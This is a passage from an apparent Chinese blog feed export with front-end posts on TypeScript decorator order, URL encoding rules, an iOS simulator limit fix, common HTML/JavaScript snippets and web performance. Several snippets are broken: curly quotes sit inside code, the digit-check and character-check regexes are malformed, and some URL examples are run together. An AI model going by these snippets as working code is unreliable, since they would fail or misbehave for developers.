class="line">&#x2F;&#x2F; Getter for num returned 2</span><br><span class="line">&#x2F;&#x2F; 4</span><br></pre></td></tr></table></figure>
<h3 id="装饰器加载顺序"><a href="#装饰器加载顺序" class="headerlink" title="装饰器加载顺序"></a>装饰器加载顺序</h3><p><img src="https://upload-images.jianshu.io/upload_images/10024246-9464275773b2a9c2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function ClassDecorator() &#123;</span><br><span class="line">    return function (target) &#123;</span><br><span class="line">        console.log(&quot;I am class decorator&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function MethodDecorator() &#123;</span><br><span class="line">    return function (target, methodName: string, descriptor: PropertyDescriptor) &#123;</span><br><span class="line">        console.log(&quot;I am method decorator&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function Param1Decorator() &#123;</span><br><span class="line">    return function (target, methodName: string, paramIndex: number) &#123;</span><br><span class="line">        console.log(&quot;I am parameter1 decorator&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function Param2Decorator() &#123;</span><br><span class="line">    return function (target, methodName: string, paramIndex: number) &#123;</span><br><span class="line">        console.log(&quot;I am parameter2 decorator&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function PropertyDecorator() &#123;</span><br><span class="line">    return function (target, propertyName: string) &#123;</span><br><span class="line">        console.log(&quot;I am property decorator&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@ClassDecorator()</span><br><span class="line">class Hello &#123;</span><br><span class="line">    @PropertyDecorator()</span><br><span class="line">    greeting: string;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @MethodDecorator()</span><br><span class="line">    greet( @Param1Decorator() p1: string, @Param2Decorator() p2: string) &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I am property decorator</span><br><span class="line">I am parameter2 decorator</span><br><span class="line">I am parameter1 decorator</span><br><span class="line">I am method decorator</span><br><span class="line">I am class decorator</span><br></pre></td></tr></table></figure>
<p>从上述例子得出如下结论：</p>
<ol>
<li><p>有多个参数装饰器时：从最后一个参数依次向前执行</p>
</li>
<li><p>方法和方法参数中参数装饰器先执行。</p>
</li>
<li><p>类装饰器总是最后执行。</p>
</li>
<li><p>方法和属性装饰器，谁在前面谁先执行。因为参数属于方法一部分，所以参数会一直紧紧挨着方法执行。</p>
</li>
</ol>
<p>上述例子中属性和方法调换位置，输出如下结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I am parameter2 decorator</span><br><span class="line">I am parameter1 decorator</span><br><span class="line">I am method decorator</span><br><span class="line">I am property decorator</span><br><span class="line">I am class decorator</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>URL编码</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/URL%E7%BC%96%E7%A0%81/</url>
    <content><![CDATA[<p>URL的架构——————-<br><scheme>://<username>:<password>@<host>:<port>/<parameters>?<query>#<fragment><br>&lt;模式&gt; ://&lt;用户名&gt;:&lt;密码&gt;@&lt;主机地址&gt;:&lt;端口&gt;/&lt;路径&gt;;&lt;参数&gt;?&lt;查询&gt;#&lt;信息片断&gt;</p>
<p>模式——-<br>通常是指用来访问URL所标明地址的资源的协议.<br>如果一个模式向IANA注册过,那么它就是官方的(如HTTP,FTP)<br>但也有非官方的(未注册)的模式在普遍使用,(如SFTP,svn)<br>scheme: 为一部分,//不属于分隔符的一部分,是URL下一部分的开始.</p>
<p>{ …..//&lt;用户名&gt;:&lt;密码&gt;@&lt;主机地址&gt;:&lt;端口&gt;…}—————————————————————<br>构成了URL的权限控制部分</p>
<p>只提供用户名<br><a href="ftp://some_user@code.google.com/">ftp://some_user@code.google.com/</a><br>提供用户名和密码<br><a href="ftp://some_user:password@code.google.com/">ftp://some_user:password@code.google.com/</a><br>如果你不提供用户名和密码,而你试图访问的URL要求你提供,那么应用程序(如:浏览器)将提供一些默认值.</p>
<p>主机———<br>主机地址可以是域名或IP地址,正如我们所知,域名会解析成IP地址(通过DNS查找)以确定我们正在尝试访问<br>的机器的地址.</p>
<p>端口——–<br>它告诉我们,我们连接到机器上的指定应用正在监听什么网络端口,如果省略,则使用默认值 ,HTTP的默认为80</p>
<p>路径——–<br>以 / 作为前缀从URL组成部分中分离.一个路径由一系列的 / 字符分隔的片断组成.<br>告诉我们资源在服务器上的位置,每个路径片断都可以包含参数,以 ;  号与路径片断隔开,如:<br><a href="http://www.soon.com/aaa;para1=xxx/bbb;para2=yyy/my.html">http://www.soon.com/aaa;para1=xxx/bbb;para2=yyy/my.html</a><br>这样的URL是完全有效的.</p>
<p>参数———<br>它们可以出现在路径之后,查询字符串之前,以 ; 号与URL的其它部分和其它参数隔开,如:<br><a href="http://www.soon.com/aaa/bbb/ccc/my.html;para1=xyz;para2=abc">http://www.soon.com/aaa/bbb/ccc/my.html;para1=xyz;para2=abc</a><br>它们不是很常见.</p>
<p>查询———<br>它们十分常见.<br>这是发送一些参数到服务器资源上的首选方式.<br>这些以  关键字=值  的查询对以?号与URL的其它部分隔开,并且以&amp;符号与其它的 [查询对] 分开.使用 ; 号将 [查询对] 分开也是合法的. </p>
<blockquote>
<p><a href="http://www.soon.com/bbs/about.html?para1=ok&amp;para2=yes">http://www.soon.com/bbs/about.html?para1=ok&amp;para2=yes</a>    等价于<br><a href="http://www.soon.com/bbs/about.html?para1=ok;para2=yes">http://www.soon.com/bbs/about.html?para1=ok;para2=yes</a></p>
</blockquote>
<p>信息片断—————<br>这是一个URL的可选部分,用于描述资源的一个特定部分.我们通常看到它们用于链接到HTML文档中的特定部分.信息片断以#号与URL的其它部分隔开.当从服务器请求一个以URL寻址的资源时,客户端通常不会发送信息片断到服务器(至少HTTP协议不会).一旦客户端获取资源,它将使用信息片断处理有关部分.————————– 上面是URL的九大部分 —————————–</p>
<p> URL该如何进行正确的编码?哪些字符可以在URL中安全的使用?<br> 哪些字符不能使用?</p>
<h2 id="URL的特殊字符"><a href="#URL的特殊字符" class="headerlink" title=" URL的特殊字符"></a> URL的特殊字符</h2><p> 当几种特定的字符集合出现在URL中时,你必须特别注意:</p>
<p>首先,在URL中有特殊意义的字符,也就是保留字符:<br> ;    /    ?   :     @     &amp;     =     +    $     ,        {10个}<br> 这意味着,这些字符通常在URL中使用时,是有特殊含义的(如 “:”把每一个部分分隔开来),如果一个URL的某一部分(如查询参数的一部分)可能包含这些字符之一,则应该在放入URL之前对其进行转义处理.<br>  第二组需要注意的字符集是非保留字符集.如下:<br>  -  _   .   !   ~   *   ‘   (   )             {9个}<br> 这些字符可以被用于URL的任何位置(有些地方,不允许它们出现.使用它们作为URL的一部分时,你不需要进行编码/转义处理.你可以对它们进行转义操作且不影响URL的语义,但不建议这么做.<br>第三组  不推荐字符 也就是避用字符集合使用它们是不明智的:<br>{  }  |   \   ^  [   ]   `::数字1键前::       {8个}<br>不明智的原因:网关有时会修改这样的字符,或者将其作为分隔符使用.这并不意味着网关总会修改这些字符,但这种情况可能发生.如果真是要使用这些字符,请做转义处理.<br>第四组   例外字符集<br>这组字符集是所有的ASCII控制字符组成.包含空格字符以下列字符:<br>&lt;   &gt;   #   %   “      {5 个}<br>控制字符是不可打印的US-ASCII字符(十六进制00~1F及7F)<br>如果使用,请转义处理.有些字符#(哈希)和%(百分比)在URL上下文中有着特殊含义,你可以把它们当作保留字符对待.这个集合中的其它字符无法被打印,因此对它们进行转义是唯一的表示方式, &lt;   &gt;   “   这三个字符需要被转义，因为这些字符通常用来在文本中分隔URL</p>
<p>编码/转义————————-<br>通常将它的ASCII十六进制值加上一个%字符．<br>如空格字符的URL编码是　%20<br>%字符本身被编码为%25</p>
<p>这就是你所需要知道的所有URL的特殊字符，当然，从这些字符外，英文字母<br>和数字是可以直接使用而不需要进行编码的：）</p>
<p>！！！　必须记住<br>URL应该始终保持其编码形式．只有当你要拆分URL的时候，才应该对其进行<br>解码．每个URL部分，都必须分别进行编码．<br>应该避免重复编码／解码一个URL．如果你编码一个URL一次，但解码两次，而<br>这个URL包含%字符，那么你将破坏掉你的URL<br>可以查看　RFC 2396 中的定义</p>
<p>绝对URL和相对URL———————————-<br>如果一个URL包含scheme部分的话（如http），那它就可以被看做绝对URL．<br>但相对URL就有点复杂了．<br>相对URL永远是代表着相对于另外一个URL而言的，其它的URL被称为base URL.<br>将相对URL变成绝对URL的形式，我们首先要了解它的base URL，接着把它跟相<br>对URL的语法结合之后就得到绝对URL．<br>在一个HTML文档中看到的相对URL，在这种情况有两个方法找到它的对应的<br>base URL．<br>１,base URL可能由html的<base>标签指出．<br>２,如果没有指定base标签，那么该html文档的url地址就被视为它的base URL.<br>一旦我们有了base URL ,我们就可以试着将我们的相对URL转成绝对URL.<br>首先要将相对URL拆分成单个的结构（scheme,authority(host,post),path,query<br>string,fragment)<br>拆解完成后，有几个地方需要注意，因为它们可能说明我们转换的相对URL不一定对．<br>１,如果没有［scheme］［authority］或［path］，那么这个相对URL是base URL的<br>一个引用．<br>２,如果有［scheme］，那么这个相对URL其实是绝对URL，所以用绝对URL的方式处理．<br>３,如果没有［scheme］，但是有［authority(host,post)］，那么我们相对URL可能是网路位址那么我们根据base URL的［模式］并且把它跟相对URL用://结合起来．<br>４,如果没有上述的这些特殊情形，那我们得到的则是一个完全的相对URL．现在我们需要根据如下的程序进行处理．<br>５,我们从base URL继承它的scheme以及authority(host,post).<br>６,如果相对URL开头是一个/，那么它是一个绝对路径，我们可以通过继承得到的authoruity和host，用适当的分隔号产生绝对url<br>７,如果相对URL的开头不是一个/，那我们把base URL中／以后的东西都移除．然后把我们相对URL加上去得到最后的路径，再根据前面的几个字符对相对URL做一点小处理．<br>８,如果最后的路径包含./　　<br>我们直接把它去掉（这代表我们的相对URL由./开始，就像./blah.html)<br>９,如果最后的路径包含../　　<br>我们可以去掉它并且把路径上移一个区段，就好像把所有像样的路径组合都去掉＂＜segment＞/../＂,持续这个过程，直到找不到任何的../这表示我们的相对路径开头是多个../像是../blah.htm或../../blah.html<br>１０,如果路径的结尾是.. ,那就去掉它并且把路径上移一个区段，比如移除””<segment>/../“<br> 这表示我们的相对路径是．．<br> １１,如果路径的结尾是．，那就把它去掉，表示我们的相对路径很有可能是．<br> 根据这些规则我们可以简单把相对URL的query或者fragment利用合适的分隔符号<br> 包含到我们的URL中去，这样就将相对URL转换成了绝对URL．</p>
<p> 范例：<br> base:  <a href="http://www.blah.com/yadda1/yadda2/yadda3?param1=foo#barrelative:rel1">http://www.blah.com/yadda1/yadda2/yadda3?param1=foo#barrelative:rel1</a><br> final  :  <a href="http://www.blah.com/yadda1/yadda2/rel1">http://www.blah.com/yadda1/yadda2/rel1</a></p>
<p> base:  <a href="http://www.blah.com/yadda1/yadda2/yadda3?param1=foo#barrelative:/rel1">http://www.blah.com/yadda1/yadda2/yadda3?param1=foo#barrelative:/rel1</a><br> final :   <a href="http://www.blah.com/rel1">http://www.blah.com/rel1</a></p>
<p> base:  <a href="http://www.blah.com/yadda1/yadda2/yadda3?param1=foo#barrelative:../rel1">http://www.blah.com/yadda1/yadda2/yadda3?param1=foo#barrelative:../rel1</a><br> base:  <a href="http://www.blah.com/yadda1/rel1">http://www.blah.com/yadda1/rel1</a></p>
<p> base:  <a href="http://www.blah.com/yadda1/yadda2/yadda3?param1=foo#barrelative:./rel1?param2=baz#bar2">http://www.blah.com/yadda1/yadda2/yadda3?param1=foo#barrelative:./rel1?param2=baz#bar2</a><br> final:    <a href="http://www.blah.com/yadda1/yadda2/rel1?param2=baz#bar2">http://www.blah.com/yadda1/yadda2/rel1?param2=baz#bar2</a></p>
<p>base:    <a href="http://www.blah.com/yadda1/yadda2/yadda3?param1=foo#barrelative">http://www.blah.com/yadda1/yadda2/yadda3?param1=foo#barrelative</a>: ..<br> final :    <a href="http://www.blah.com/yadda1/">http://www.blah.com/yadda1/</a></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>Unable to boot device due to insufficient system resources</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/Unable-to-boot-device-due-to-insufficient-system-resources-/</url>
    <content><![CDATA[<p>iOS模拟器当启动的模拟器数量过多时，会提示：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-e6efd02dc51166b2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>该问题是模拟器的内存超出最大限额，可以通过修改内存大小来启动更多的模拟器</p>
<p>sudo launchctl limit maxfiles 2000 unlimited<br><a href="https://help.apple.com/simulator/mac/9.0/index.html#/dev8a5f2aa4e">https://help.apple.com/simulator/mac/9.0/index.html#/dev8a5f2aa4e</a></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>WEB前端开发者常用的代码</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E8%80%85%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<p>1、将彻底屏蔽鼠标右键</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">oncontextmenu&#x3D;&quot;window.event.returnValue&#x3D;false&quot; </span><br><span class="line">&lt;table border oncontextmenu&#x3D;return(false)&gt;&lt;td&gt;no&lt;&#x2F;table&gt; &#x2F;&#x2F;可用于 Table</span><br></pre></td></tr></table></figure>
<p>2、取消选取、防止复制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body onselectstart&#x3D;&quot;return false&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>3.JS不允许粘贴</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body onpaste&#x3D;&quot;return false&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>4、JS防止复制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body oncopy&#x3D;&quot;return false;&quot; oncut&#x3D;&quot;return false;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>5、IE 地址栏前换成自己的图标</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;Shortcut Icon&quot; href&#x3D;&quot;favicon.ico&quot;&gt;</span><br><span class="line">&#x2F;&#x2F;在文件的根目录放进去这个图片，后缀修改成ico就可以了</span><br></pre></td></tr></table></figure>
<p>6.可以在收藏夹中显示出你的图标<br>  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;Bookmark&quot; href&#x3D;&quot;favicon.ico&quot;&gt;</span><br></pre></td></tr></table></figure><br>7.关闭输入法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input style&#x3D;&quot;ime-mode:disabled&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>8、永远都会带着框架</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;JavaScript&quot;&gt;&lt;!– if (window &#x3D;&#x3D; top)top.location.href &#x3D; “frames.htm&quot;; &#x2F;&#x2F;frames.htm 为框架网页 &#x2F;&#x2F; –&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>9、防止被人 frame</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;SCRIPT LANGUAGE&#x3D;JAVASCRIPT&gt;&lt;!– if (top.location !&#x3D; self.location)top.location&#x3D;self.location; &#x2F;&#x2F; –&gt;&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
<p>10、网页将不能被另存为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;noscript&gt;&lt;iframe src&#x3D;*.Html&gt;&lt;&#x2F;iframe&gt;&lt;&#x2F;noscript&gt;</span><br></pre></td></tr></table></figure>
<p>11、查看网页源代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input type&#x3D;button value&#x3D;“查看网页源代码&quot;onclick&#x3D;&quot;window.location &#x3D; “view-source:&quot;+ “http:&#x2F;&#x2F;www.pconline.com.cn&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>12、光标是停在文本框文字的最后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;javascript&quot;&gt; </span><br><span class="line">function cc() &#123; </span><br><span class="line">      var e &#x3D; event.srcElement; </span><br><span class="line">      var r &#x3D;e.createTextRange();</span><br><span class="line">       r.moveStart(“character&quot;,e.value.length); </span><br><span class="line">      r.collapse(true); </span><br><span class="line">      r.select(); </span><br><span class="line">&#125;</span><br><span class="line"> &lt;&#x2F;script&gt; </span><br><span class="line">&lt;input type&#x3D;text name&#x3D;text1 value&#x3D;&quot;123″ onfocus&#x3D;&quot;cc()&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>13、判断上一页的来源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript: document.referrer</span><br></pre></td></tr></table></figure>
<p>14、最小化、最大化、关闭窗口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;object id&#x3D;hh1 classid&#x3D;&quot;clsid:ADB880A6-D8FF-11CF-9377-00AA003B7A11″&gt; &lt;param name&#x3D;&quot;Command&quot; value&#x3D;&quot;Minimize&quot;&gt;&lt;&#x2F;object&gt; &lt;object id&#x3D;hh2 classid&#x3D;&quot;clsid:ADB880A6-D8FF-11CF-9377-00AA003B7A11″&gt; &lt;param name&#x3D;&quot;Command&quot; value&#x3D;&quot;Maximize&quot;&gt;&lt;&#x2F;object&gt; &lt;OBJECT id&#x3D;hh3 classid&#x3D;&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11″&gt; &lt;PARAM NAME&#x3D;&quot;Command&quot; VALUE&#x3D;&quot;Close&quot;&gt;&lt;&#x2F;OBJECT&gt; &lt;input type&#x3D;button value&#x3D;最小化 onclick&#x3D;hh1.Click()&gt; &lt;input type&#x3D;button value&#x3D;最大化 onclick&#x3D;hh2.Click()&gt; &lt;input type&#x3D;button value&#x3D;关闭 onclick&#x3D;hh3.Click()&gt; 本例适用于 IE</span><br></pre></td></tr></table></figure>
<p>15.屏蔽功能键 Shift,Alt,Ctrl</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line">function look()&#123;</span><br><span class="line">   if(event.shiftKey) </span><br><span class="line">  alert(“禁止按 Shift 键!&quot;); </span><br><span class="line">  &#x2F;&#x2F;可以换成 ALT CTRL</span><br><span class="line">&#125; </span><br><span class="line">document.onkeydown&#x3D;look;</span><br><span class="line"> &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>16、网页不会被缓存</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;META HTTP-EQUIV&#x3D;&quot;pragma&quot; CONTENT&#x3D;&quot;no-cache&quot;&gt; </span><br><span class="line">&lt;META HTTP-EQUIV&#x3D;&quot;Cache-Control&quot; CONTENT&#x3D;&quot;no-cache, must-revalidate&quot;&gt; </span><br><span class="line">&lt;META HTTP-EQUIV&#x3D;&quot;expires&quot; CONTENT&#x3D;&quot;Wed, 26 Feb 1997 08:21:57 GMT&quot;&gt; &#x2F;&#x2F;或者&lt;META HTTP-EQUIV&#x3D;&quot;expires&quot; CONTENT&#x3D;&quot;0″&gt;</span><br></pre></td></tr></table></figure>
<p>17、怎样让表单没有凹凸感？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input type&#x3D;text style&#x3D;&quot;border:1 solid #000000″&gt; 或 &lt;input type&#x3D;text style&#x3D;&quot;border-left:none; border-right:none; border-top:none; border-bottom: 1 solid #000000″&gt;&lt;&#x2F;textarea&gt;</span><br></pre></td></tr></table></figure>
<p>18.div span layer的区别？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;(division)用来定义大段的页面元素，会产生转行 &lt;span&gt;用来定义同一行内的元素，跟&lt;div&gt;的唯一区别是不产生转行 &lt;layer&gt;是 ns 的标记，ie 不支持，相当于&lt;div&gt;</span><br></pre></td></tr></table></figure>
<p>19.让弹出窗口总是在最上面:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body onblur&#x3D;&quot;this.focus();&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>20.不要滚动条?</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;让竖条没有: </span><br><span class="line">&lt;body style&#x3D;&quot;overflow:scroll;overflow-y:hidden&quot;&gt; &lt;&#x2F;body&gt; </span><br><span class="line">&#x2F;&#x2F;&#x2F;让横条没有: </span><br><span class="line">&lt;body style&#x3D;&quot;overflow:scroll;overflow-x:hidden&quot;&gt; &lt;&#x2F;body&gt; </span><br><span class="line">&#x2F;&#x2F;两个都去掉</span><br><span class="line"> &lt;body scroll&#x3D;&quot;no&quot;&gt; &lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>
<p>21.怎样去掉图片链接点击后，图片周围的虚线？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;#&quot; onFocus&#x3D;&quot;this.blur()&quot;&gt;&lt;img src&#x3D;&quot;logo.jpg&quot; border&#x3D;0&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
<p>22.电子邮件处理提交表单</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form name&#x3D;&quot;form1″ method&#x3D;&quot;post&quot; action&#x3D;&quot;mailto:****@***.com&quot; enctype&#x3D;&quot;text&#x2F;plain&quot;&gt; </span><br><span class="line">      &lt;input type&#x3D;submit&gt;</span><br><span class="line"> &lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
<p>23.在打开的子窗口刷新父窗口的代码里如何写？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">window.opener.location.reload()   </span><br></pre></td></tr></table></figure>
<p> 24.如何设定打开页面的大小 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body onload&#x3D;&quot;top.resizeTo(300,200);&quot;&gt;</span><br><span class="line"> &#x2F;&#x2F;打开页面的位置</span><br><span class="line">&lt;body onload&#x3D;&quot;top.moveBy(300,200);&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>25.在页面中如何加入不是满铺的背景图片,拉动页面时背景图不动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;STYLE&gt; body &#123;background-image:none; background-repeat:no-repeat; background-position:center;background-attachment: fixed&#125; &lt;&#x2F;STYLE&gt;</span><br></pre></td></tr></table></figure>
<p>26、检查一段字符串是否全由数字组成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function checkNum(str)&#123;</span><br><span class="line">  return str.match(\&#x2F;D&#x2F;)&#x3D;&#x3D;null</span><br><span class="line">&#125;</span><br><span class="line">alert(checkNum(&quot;1232142141&quot;)) </span><br><span class="line">alert(checkNum(&quot;123214214a1&quot;))</span><br></pre></td></tr></table></figure>
<p>27、获得一个窗口的大小</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.body.clientWidth; document.body.clientHeight</span><br></pre></td></tr></table></figure>
<p>28、怎么判断是否是字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (&#x2F;[^&#x2F;x00-&#x2F;xff]&#x2F;g.test(s)) alert(“含有汉字&quot;); else alert(“全是字符&quot;);</span><br></pre></td></tr></table></figure>
<p>29、TEXTAREA 自适应文字行数的多少</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;textarea rows&#x3D;1 name&#x3D;s1 cols&#x3D;27 onpropertychange&#x3D;&quot;this.style.posHeight&#x3D;this.scrollHeight&quot;&gt; &lt;&#x2F;textarea&gt;</span><br></pre></td></tr></table></figure>
<p>30、日期减去天数等于第二个日期</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language&#x3D;Javascript&gt; </span><br><span class="line">function cc(dd,dadd) &#123; </span><br><span class="line">    &#x2F;&#x2F;可以加上错误处理 </span><br><span class="line">    var a &#x3D; new Date(dd) </span><br><span class="line">    a &#x3D; a.valueOf() </span><br><span class="line">    a &#x3D; a - dadd * 24 * 60 * 60 * 1000 </span><br><span class="line">    a &#x3D; new Date(a)         </span><br><span class="line">    alert(a.getFullYear() + &quot;年&quot; + (a.getMonth() + 1) + &quot;月&quot; + a.getDate() + &quot;日&quot;)</span><br><span class="line"> &#125;  </span><br><span class="line">cc(“12&#x2F;23&#x2F;2002&quot;,2) </span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>31、ENTER 键可以让光标移到下一个输入框</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input onkeydown&#x3D;&quot;if(event.keyCode&#x3D;&#x3D;13)event.keyCode&#x3D;9″&gt;</span><br></pre></td></tr></table></figure>
<p>32、各种样式的光标</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto ：标准光标 default ：标准箭头</span><br><span class="line">hand ：手形光标</span><br><span class="line">wait ：等待光标</span><br><span class="line">text ：I 形光标</span><br><span class="line">vertical-text ：水平 I 形光标</span><br><span class="line">no-drop ：不可拖动光标</span><br><span class="line">not-allowed ：无效光标</span><br><span class="line">help ：?帮助光标</span><br><span class="line">all-scroll ：三角方向标</span><br><span class="line">move ：移动标</span><br><span class="line">crosshair ：十字标</span><br><span class="line">e-resize</span><br><span class="line">n-resize</span><br><span class="line">nw-resize</span><br><span class="line">w-resize</span><br><span class="line">s-resize</span><br><span class="line">se-resize</span><br><span class="line">sw-resize</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>Web性能优化：What?Why?How?</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/Web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%EF%BC%9AWhat--Why--How-/</url>
    <content><![CDATA[<p><strong>为什么要提升Web性能？</strong></p>
<p>Web性能黄金准则：只有10% ~ 20%的最终用户响应时间花在了下载html文档上，其余的80%~90%时间花在了下载页面组件上。</p>
<p>web性能对于用户体验有及其重要的影响，根据著名的<code>2-5-8</code>原则：</p>
<ul>
<li>  当用户在2秒以内得到响应，会感觉系统的响应非常快；</li>
<li>  当用户在2-5秒之内得到响应，会感觉系统的响应速度还可以；</li>
<li>  当用户在5-8秒之内得到响应，会感觉系统的响应非常慢，但还可以接受；</li>
<li>  当用户在8秒之后都没有得到响应，会感觉系统糟透了，甚至系统已经挂掉；要么打开竞争对手的网站，要么重新发起第二次请求。</li>
</ul>
<p>凡事都需要研究，通过科学的研究我们就可以找到事物的发展规律。这里要感谢雅虎的工程师总结的14条前端优化法则，使得我们可以站在巨人的肩膀上。《高性能网站建设》这本书中的14条优化原则，总结起来主要是以下个方面的优化：</p>
<ol>
<li> 减少HTTP请求</li>
<li> 页面内部优化</li>
<li> 启用缓存</li>
<li> 减少下载量</li>
<li> 网络连接上的优化</li>
</ol>
<p><strong>为什么减少HTTP请求可以提高Web性能？</strong></p>
<p>要回答这个问题，我们就要了解当浏览器向服务器发送一个http请求知道获取数据都经历哪些过程：</p>
<p><code>开启一个链接（tcp/ip的三次握手过程）</code>-》<code>发送请求</code>-》<code>等待（网络延迟跟服务器的处理时间）</code>-》<code>下载数据</code></p>
<p>我们看一下百度首页中的http请求在各阶段耗费的时间，上面不同的颜色代表下图中的不同阶段</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-469e68be49a621d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Web性能优化：What?Why?How?_"></p>
<p>可以看到除了图片之外，其余大部分http请求的事件花在了建立连接与等待阶段。</p>
<p>http协议建立在TIC/IP协议之上，在TCP/IP协议中，TCP协议提供可靠的连接服务，采用三次握手建立一个连接。 简单来说三次握手就是一个身份确认的过程：</p>
<p>（第一次握手：主机A发送位码为syn＝1,随机产生seq number=1234567的数据包到服务器，主机B由SYN=1知道，A要求建立联机；）</p>
<blockquote>
<p>晴儿：你是潇哥哥吗，我是晴儿</p>
</blockquote>
<p>（第二次握手：主机B收到请求后要确认联机信息，向A发送ack number=(主机A的seq+1),syn=1,ack=1,随机产生seq=7654321的包）</p>
<blockquote>
<p>潇剑：这货是谁，一箫一剑走江湖，下一句是什么？</p>
</blockquote>
<p>（第三次握手：主机A收到后检查ack number是否正确，即第一次发送的seq number+1,以及位码ack是否为1，若正确，主机A会再发送ack number=(主机B的seq+1),ack=1,主机B收到后确认seq值与ack=1则连接建立成功。）</p>
<blockquote>
<p>晴儿：这首诗。。。你真的是潇哥哥，一萧一剑走江湖，千古情愁酒一回。。。<br>潇剑：晴儿，你真的是晴儿。。。。</p>
</blockquote>
<p>言归正传，这个过程也是需要消耗时间的，在百度首页找到一个极端的例子：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-bbac62a159ab0da2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Web性能优化：What?Why?How?_"></p>
<p>而等待的时间通常也大于内容下载的时间，这里同样找到一个极端例子：</p>
